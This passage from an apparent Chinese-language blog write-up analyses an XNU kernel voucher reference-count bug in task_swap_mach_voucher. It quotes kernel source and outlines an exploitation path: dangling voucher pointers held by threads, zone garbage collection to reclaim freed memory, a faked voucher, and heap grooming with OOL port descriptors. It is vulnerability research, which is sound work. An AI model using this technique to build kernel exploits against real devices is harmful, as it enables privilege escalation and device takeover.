__MigKernelSpecificCode */</span></span></span><br><span class="line">	OutP-&gt;old_voucher.name = (<span class="type">mach_port_t</span>)convert_voucher_to_port(old_voucher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">	OutP-&gt;Head.msgh_size = (<span class="type">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</span><br><span class="line">	OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">	__AfterRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_port_to_voucher</code>函数通过调用<code>ipc_voucher_reference</code>函数将引用计数增加1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	convert_port_to_voucher</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Convert from a port to a voucher.</span></span><br><span class="line"><span class="comment"> *		Doesn&#x27;t consume the port [send-right] ref;</span></span><br><span class="line"><span class="comment"> *		produces a voucher ref,	which may be null.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Caller has a send-right reference to port.</span></span><br><span class="line"><span class="comment"> *		Port may or may not be locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_voucher_t</span></span><br><span class="line"><span class="title function_">convert_port_to_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>	port)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IP_VALID(port)) &#123;</span><br><span class="line">		<span class="type">ipc_voucher_t</span> voucher = (<span class="type">ipc_voucher_t</span>) port-&gt;ip_kobject;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * No need to lock because we have a reference on the</span></span><br><span class="line"><span class="comment">		 * port, and if it is a true voucher port, that reference</span></span><br><span class="line"><span class="comment">		 * keeps the voucher bound to the port (and active).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip_kotype(port) != IKOT_VOUCHER)</span><br><span class="line">			<span class="keyword">return</span> IV_NULL;</span><br><span class="line"></span><br><span class="line">		assert(ip_active(port));</span><br><span class="line"></span><br><span class="line">		ipc_voucher_reference(voucher);</span><br><span class="line">		<span class="keyword">return</span> (voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> IV_NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_voucher_to_port</code>函数通过调用<code>ipc_voucher_release</code>函数将引用计数减少1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert a voucher to a port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_port_t</span></span><br><span class="line"><span class="title function_">convert_voucher_to_port</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span>	port, send;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IV_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span> (IP_NULL);</span><br><span class="line"></span><br><span class="line">	assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a port if needed */</span></span><br><span class="line">	port = voucher-&gt;iv_port;</span><br><span class="line">	<span class="keyword">if</span> (!IP_VALID(port)) &#123;</span><br><span class="line">		port = ipc_port_alloc_kernel();</span><br><span class="line">		assert(IP_VALID(port));</span><br><span class="line">		ipc_kobject_set_atomically(port, (<span class="type">ipc_kobject_t</span>) voucher, IKOT_VOUCHER);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* If we lose the race, deallocate and pick up the other guy&#x27;s port */</span></span><br><span class="line">		<span class="keyword">if</span> (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) &#123;</span><br><span class="line">			ipc_port_dealloc_kernel(port);</span><br><span class="line">			port = voucher-&gt;iv_port;</span><br><span class="line">			assert(ip_kotype(port) == IKOT_VOUCHER);</span><br><span class="line">			assert(port-&gt;ip_kobject == (<span class="type">ipc_kobject_t</span>)voucher);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ip_lock(port);</span><br><span class="line">	assert(ip_active(port));</span><br><span class="line">	send = ipc_port_make_send_locked(port);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == port-&gt;ip_srights) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> old_notify;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* transfer our ref to the port, and arm the no-senders notification */</span></span><br><span class="line">		assert(IP_NULL == port-&gt;ip_nsrequest);</span><br><span class="line">		ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify);</span><br><span class="line">		<span class="comment">/* port unlocked */</span></span><br><span class="line">		assert(IP_NULL == old_notify);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* piggyback on the existing port reference, so consume ours */</span></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">		ipc_voucher_release(voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (send);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到上面的实现中，在<code>task_swap_mach_voucher</code>函数调用后，通过调用<code>ipc_voucher_release</code>函数将<code>new_voucher</code>的引用计数减1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line">ipc_voucher_release(new_voucher);</span><br></pre></td></tr></table></figure>

<p>因此，这个过程中，引用计数的变化如下：</p>
<ol>
<li><code>new_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher</code>的引用计数+1          &#x3D;&gt; <code>convert_port_to_voucher()</code></li>
<li><code>old_voucher = new_voucher</code>      &#x3D;&gt; <code>task_swap_mach_voucher()</code></li>
<li><code>new_voucher</code>的引用计数-1           &#x3D;&gt; <code>ipc_voucher_release()</code></li>
<li><code>new_voucher</code>的引用计数-1 <code>(old_voucher = new_voucher)  =&gt;  convert_voucher_to_port</code></li>
</ol>
<p>将<code>new_voucher</code>的引用计数减少为0，从而释放该对象。并且<code>old_voucher</code>的引用计数可以增加很多。如果存储指向<code>new_voucher</code>的指针，然后使用漏洞将<code>new_voucher</code>的引用计数减少为0，这样就有可能获得指向<code>new_voucher</code>的悬空指针。</p>
<h2 id="利用voucher"><a href="#利用voucher" class="headerlink" title="利用voucher"></a>利用voucher</h2><p>现在需要找到哪里可以存储<code>ipc_voucher</code>指针，方法是直接在内核源码中搜索<code>ipc_voucher_t</code>，发现在<code>osfmk/kern/thread.h</code>的thread对象有一个成员能够持有<code>ipc_voucher</code>指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_EMBEDDED */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span>			thread_callout_interrupt_wakeups;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_callout_platform_idle_wakeups;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_timer_wakeups_bin_1;</span><br><span class="line">	<span class="type">uint32_t</span>			thread_timer_wakeups_bin_2;</span><br><span class="line">	<span class="type">uint16_t</span>			thread_tag;</span><br><span class="line">	<span class="type">uint16_t</span>			callout_woken_from_icontext:<span class="number">1</span>,</span><br><span class="line">					callout_woken_from_platform_idle:<span class="number">1</span>,</span><br><span class="line">					callout_woke_thread:<span class="number">1</span>,</span><br><span class="line">					thread_bitfield_unused:<span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">mach_port_name_t</span>		ith_voucher_name;</span><br><span class="line">	<span class="type">ipc_voucher_t</span>			ith_voucher;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_IOSCHED</span></span><br><span class="line">	<span class="type">void</span> 				*decmp_upl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_IOSCHED */</span></span></span><br></pre></td></tr></table></figure>

<p>使用<code>thread_get_mach_voucher</code>和<code>thread_set_mach_voucher</code>函数从用户态读取和写入<code>voucher</code>引用。查看MIG为该函数生成的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine thread_get_mach_voucher */</span></span><br><span class="line">mig_internal novalue _Xthread_get_mach_voucher</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">	thr_act = convert_port_to_thread(In0P-&gt;Head.msgh_request_port);</span><br><span class="line"></span><br><span class="line">	RetCode = thread_get_mach_voucher(thr_act, In0P-&gt;which, &amp;voucher);</span><br><span class="line">	thread_deallocate(thr_act);</span><br><span class="line">	<span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</span><br><span class="line">		MIG_RETURN_ERROR(OutP, RetCode);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	OutP-&gt;voucher.name = (<span class="type">mach_port_t</span>)convert_voucher_to_port(voucher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">	OutP-&gt;Head.msgh_size = (<span class="type">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</span><br><span class="line">	OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">	__AfterRcvRpc(<span class="number">3625</span>, <span class="string">&quot;thread_get_mach_voucher&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦获得了指向已释放<code>voucher</code>对象的悬空指针，便可以使用其他对象占用已释放的<code>voucher</code>对象。但这并不容易，<code>voucher</code>通常位于自己的<code>ipc voucher zone</code>中，如<code>osfmk/ipc/ipc_voucher.c</code>所示，其中<code>zinit</code>为<code>voucher</code>分配了一个新<code>zone</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">natural_t</span> ipc_voucher_max = (task_max + thread_max) * <span class="number">2</span>;</span><br><span class="line">	<span class="type">natural_t</span> attr_manager_max = MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN;</span><br><span class="line">	<span class="type">iv_index_t</span> i;</span><br><span class="line"></span><br><span class="line">	ipc_voucher_zone = zinit(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 ipc_voucher_max * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher),</span><br><span class="line">				 <span class="string">&quot;ipc vouchers&quot;</span>);</span><br><span class="line">	zone_change(ipc_voucher_zone, Z_NOENCRYPT, TRUE);</span><br><span class="line"></span><br><span class="line">	ipc_voucher_attr_control_zone = zinit(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 attr_manager_max * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_voucher_attr_control),</span><br><span class="line">				 <span class="string">&quot;ipc voucher attr controls&quot;</span>);</span><br><span class="line">	zone_change(ipc_voucher_attr_control_zone, Z_NOENCRYPT, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* initialize voucher hash */</span></span><br><span class="line">	ivht_lock_init();</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; IV_HASH_BUCKETS; i++)</span><br><span class="line">		queue_init(&amp;ivht_bucket[i]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* initialize global table locking */</span></span><br><span class="line">	ivgt_lock_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(MACH_VOUCHER_ATTR_KEY_USER_DATA) || defined(MACH_VOUCHER_ATTR_KEY_TEST)</span></span><br><span class="line">	user_data_attr_manager_init();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，被释放的<code>voucher</code>的内存将被放置在<code>zone</code>的<code>freelist</code>中，并在创建新<code>voucher</code>时分配给新<code>voucher</code>。为了用其他对象占用，唯一可行的方法是触发<code>zone</code>垃圾收集，它会将被释放的<code>voucher</code>的内存(最小大小为1页)移到<code>zone map</code>中，然后这些内存就可以重新分配给其他对象。可以通过分配大量<code>voucher</code>并释放它们来做到这一点。</p>
<p>回到MIG为<code>thread_get_mach_voucher</code>生成的代码。假设已经使用其他对象占据了已释放的<code>voucher</code>对象，则调用<code>thread_get_mach_voucher</code>应该成功而内核不会<code>panic</code>，这意味着该<code>voucher</code>应该具有有效的<code>iv_refs</code>成员。</p>
<p>随后，调用<code>convert_voucher_to_port</code>函数，该函数首先使用<code>assert()</code>检查<code>voucher</code>是否具有正确的引用计数。然后再使用<code>IP_VALID()</code>检查<code>voucher</code>端口的有效性。如果无效，则会分配一个新的<code>voucher</code>端口。这很有用，因为在分配伪造的<code>voucher</code>占用已释放的<code>voucher</code>时，如果以某种方式将<code>iv_port</code>指针设置为<code>NULL</code>，那么实际上还可以将新分配的<code>voucher</code>端口<code>(IKOT_VOUCHER)</code>返回到用户态<code>(ith_voucher-&gt;iv_port)</code>。这将使我们能够进一步操纵<code>voucher</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert a voucher to a port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ipc_port_t</span></span><br><span class="line"><span class="title function_">convert_voucher_to_port</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span>	port, send;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IV_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span> (IP_NULL);</span><br><span class="line"></span><br><span class="line">	assert(os_ref_get_count(&amp;voucher-&gt;iv_refs) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a port if needed */</span></span><br><span class="line">	port = voucher-&gt;iv_port;</span><br><span class="line">	<span class="keyword">if</span> (!IP_VALID(port)) &#123;</span><br><span class="line">		port = ipc_port_alloc_kernel();</span><br><span class="line">		assert(IP_VALID(port));</span><br><span class="line">		ipc_kobject_set_atomically(port, (<span class="type">ipc_kobject_t</span>) voucher, IKOT_VOUCHER);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* If we lose the race, deallocate and pick up the other guy&#x27;s port */</span></span><br><span class="line">		<span class="keyword">if</span> (!OSCompareAndSwapPtr(IP_NULL, port, &amp;voucher-&gt;iv_port)) &#123;</span><br><span class="line">			ipc_port_dealloc_kernel(port);</span><br><span class="line">			port = voucher-&gt;iv_port;</span><br><span class="line">			assert(ip_kotype(port) == IKOT_VOUCHER);</span><br><span class="line">			assert(port-&gt;ip_kobject == (<span class="type">ipc_kobject_t</span>)voucher);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ip_lock(port);</span><br><span class="line">	assert(ip_active(port));</span><br><span class="line">	send = ipc_port_make_send_locked(port);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == port-&gt;ip_srights) &#123;</span><br><span class="line">		<span class="type">ipc_port_t</span> old_notify;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* transfer our ref to the port, and arm the no-senders notification */</span></span><br><span class="line">		assert(IP_NULL == port-&gt;ip_nsrequest);</span><br><span class="line">		ipc_port_nsrequest(port, port-&gt;ip_mscount, ipc_port_make_sonce_locked(port), &amp;old_notify);</span><br><span class="line">		<span class="comment">/* port unlocked */</span></span><br><span class="line">		assert(IP_NULL == old_notify);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* piggyback on the existing port reference, so consume ours */</span></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">		ipc_voucher_release(voucher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (send);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用OOL端口描述符进行堆风水"><a href="#利用OOL端口描述符进行堆风水" class="headerlink" title="利用OOL端口描述符进行堆风水"></a>利用OOL端口描述符进行堆风水</h2><p>回顾Mach复杂消息的描述符成员，其中有一个<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>消息类型。当通过<code>mach_msg</code>发送Mach消息时依次调用<code>mach_msg_send-&gt;ipc_kmsg_copyin-&gt;ipc_kmsg_copyin_body</code>，在<code>ipc_kmsg_copyin_body</code>函数中对于<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>的情况会调用<code>ipc_kmsg_copyin_ool_ports_descriptor</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_descriptor_t</span> *</span><br><span class="line"><span class="title function_">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_descriptor_t</span> *user_dsc,</span></span><br><span class="line"><span class="params">	<span class="type">int</span> is_64bit,</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_space_t</span> space,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_object_t</span> dest,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_kmsg_t</span> kmsg,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_option_t</span> *optionp,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_return_t</span> *mr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *data;</span><br><span class="line">    <span class="type">ipc_object_t</span> *objects;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">mach_vm_offset_t</span> addr;</span><br><span class="line">    <span class="type">mach_msg_type_name_t</span> user_disp;</span><br><span class="line">    <span class="type">mach_msg_type_name_t</span> result_disp;</span><br><span class="line">    <span class="type">mach_msg_type_number_t</span> count;</span><br><span class="line">    <span class="type">mach_msg_copy_options_t</span> copy_option;</span><br><span class="line">    <span class="type">boolean_t</span> deallocate;</span><br><span class="line">    <span class="type">mach_msg_descriptor_type_t</span> type;</span><br><span class="line">    <span class="type">vm_size_t</span> ports_length, names_length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_64bit) &#123;</span><br><span class="line">        <span class="type">mach_msg_ool_ports_descriptor64_t</span> *user_ool_dsc = (<span class="keyword">typeof</span>(user_ool_dsc))user_dsc;</span><br><span class="line"></span><br><span class="line">        addr = (<span class="type">mach_vm_offset_t</span>)user_ool_dsc-&gt;address;</span><br><span class="line">        count = user_ool_dsc-&gt;count;</span><br><span class="line">        deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">        copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">        user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">        type = user_ool_dsc-&gt;type;</span><br><span class="line"></span><br><span class="line">        user_dsc = (<span class="keyword">typeof</span>(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">mach_msg_ool_ports_descriptor32_t</span> *user_ool_dsc = (<span class="keyword">typeof</span>(user_ool_dsc))user_dsc;</span><br><span class="line"></span><br><span class="line">        addr = CAST_USER_ADDR_T(user_ool_dsc-&gt;address);</span><br><span class="line">        count = user_ool_dsc-&gt;count;</span><br><span class="line">        deallocate = user_ool_dsc-&gt;deallocate;</span><br><span class="line">        copy_option = user_ool_dsc-&gt;copy;</span><br><span class="line">        user_disp = user_ool_dsc-&gt;disposition;</span><br><span class="line">        type = user_ool_dsc-&gt;type;</span><br><span class="line"></span><br><span class="line">        user_dsc = (<span class="keyword">typeof</span>(user_dsc))(user_ool_dsc+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dsc-&gt;deallocate = deallocate;</span><br><span class="line">    dsc-&gt;copy = copy_option;</span><br><span class="line">    dsc-&gt;type = type;</span><br><span class="line">    dsc-&gt;count = count;</span><br><span class="line">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span><br><span class="line"></span><br><span class="line">    result_disp = ipc_object_copyin_type(user_disp);</span><br><span class="line">    dsc-&gt;disposition = result_disp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We always do a &#x27;physical copy&#x27;, but you have to specify something valid */</span></span><br><span class="line">    <span 